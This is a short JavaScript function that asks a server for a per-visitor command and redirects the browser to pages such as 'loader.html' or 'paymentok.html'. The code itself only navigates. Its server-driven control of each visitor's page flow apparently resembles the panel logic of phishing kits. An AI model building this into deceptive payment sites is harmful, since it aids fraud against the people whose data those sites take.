async function fetchCommand(visitorId){
  if(!visitorId) return;
  const res=await fetch(`/get-command?visitorId=${visitorId}`);
  const data=await res.json();
  if(data.command){
    switch(data.command){
      case "index": window.location.href="index.html"; break;
      case "info": window.location.href="info.html"; break;
      case "contact": window.location.href="contact.html"; break;
      case "visite": window.location.href="loader.html"; break;
      case "loader": window.location.href="loader.html"; break;
      case "paymentok": window.location.href="paymentok.html"; break;
    }
  }
}
